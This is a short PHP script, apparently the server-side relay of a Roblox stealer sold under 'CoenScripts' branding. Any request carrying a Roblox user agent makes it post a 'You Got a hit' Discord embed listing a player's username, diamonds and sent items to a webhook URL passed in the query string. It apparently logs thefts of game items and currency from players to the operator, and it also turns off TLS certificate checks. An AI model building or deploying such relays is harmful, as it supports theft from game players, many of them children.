<?php

function sendDiscordWebhook($username, $diamonds, $type, $sendedItem, $webhookUrl) {
    $dateTime = date("Y-m-d H:i:s");
    $fields = array(
        array(
            "name" => "👤 Username",
            "value" => $username,
            "inline" => true
        ),
        array(
            "name" => "📦 Type",
            "value" => $type,
            "inline" => true
        ),
        array(
            "name" => "📤 Sended Item",
            "value" => $sendedItem,
            "inline" => true
        )
    );

    // Add Diamonds field only if type is "Currency"
    if ($type == "Currency") {
        array_splice($fields, 1, 0, array(array(
            "name" => "💎 Diamonds",
            "value" => $diamonds,
            "inline" => true
        )));
    }

    $embed = array(
        "title" => "🎉 You Got a hit",
        "color" => 0x00ff00, // Green color
        "fields" => $fields,
        "footer" => array(
            "text" => "https://discord.gg/sPHPNr82ND - CoenScripts - $dateTime"
        )
    );
    $data = array(
        "username" => "CoenScripts",
        "avatar_url" => "https://i.ibb.co/tQ4VYXs/Coen.jpg", // Replace with the actual image URL
        "embeds" => array($embed)
    );
    $curl = curl_init($webhookUrl);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($curl);
    curl_close($curl);
}

if (isset($_GET['webhook'], $_GET['username'], $_GET['diamonds'], $_GET['type'], $_GET['sendedItem'])) {
    $webhookUrl = $_GET['webhook'];
    $username = $_GET['username'];
    $diamonds = $_GET['diamonds'];
    $type = $_GET['type'];
    $sendedItem = $_GET['sendedItem'];

    if (filter_var($webhookUrl, FILTER_VALIDATE_URL) && strpos($webhookUrl, "discord.com/api/webhooks") !== false) {
        if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Roblox') !== false) {
            sendDiscordWebhook($username, $diamonds, $type, $sendedItem, $webhookUrl);
        }
    }
}

?>
